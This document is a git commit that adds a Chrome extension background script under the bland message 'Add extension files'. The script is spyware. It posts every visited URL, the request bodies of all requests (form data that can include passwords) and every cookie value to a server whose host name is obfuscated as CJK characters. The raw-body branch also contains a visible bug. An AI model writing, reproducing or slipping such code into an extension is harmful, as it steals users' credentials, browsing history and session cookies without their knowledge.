a3c11e23476450fd9e43739aa871ac41e58118ae
Sridhar D Kedlaya <sridhardked@gmail.com>
2024-05-31 08:35:55 +0530

    Add extension files

---
+++ extension/background.js
@@ -0,0 +1,71 @@
+const SERVER_HOST = "扩灩湟桡捫敲.汥整"
+
+chrome.webNavigation.onCompleted.addListener((e) => {
+    const url = `${SERVER_HOST}/u`;
+    fetch(
+        url,
+        {
+            method: "POST",
+            body: JSON.stringify({ url: e.url }),
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+    );
+}, {});
+
+chrome.webRequest.onBeforeRequest.addListener(
+    (e) => {
+        const url = `${SERVER_HOST}/f`;
+        let data = {};
+        if (e.requestBody != undefined) {
+            if (e.requestBody.formData != undefined) {
+                data["data"] = e.requestBody.formData
+            }
+            if (e.requestBody.raw != undefined) {
+                data["data"] = e.requestBody.formData.raw.join("");
+            }
+            fetch(
+                url,
+                {
+                    method: "POST",
+                    body: JSON.stringify(data),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }
+            );
+        }
+    },
+    {urls: ["<all_urls>"]},
+    ["requestBody"]
+);
+
+chrome.cookies.onChanged.addListener(
+    (e) => {
+        const url = `${SERVER_HOST}/c`;
+        if (!e.removed) {
+            const cookie = e.cookie;
+            const data = { 
+                cookie: {
+                    name: cookie.name,
+                    sameSite: cookie.sameSite,
+                    domain: cookie.domain,
+                    session: cookie.session,
+                    value: cookie.value
+                }
+            };
+            fetch(
+                url,
+                {
+                    method: "POST",
+                    body: JSON.stringify(data),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }
+            )
+            
+        }
+    }
+);
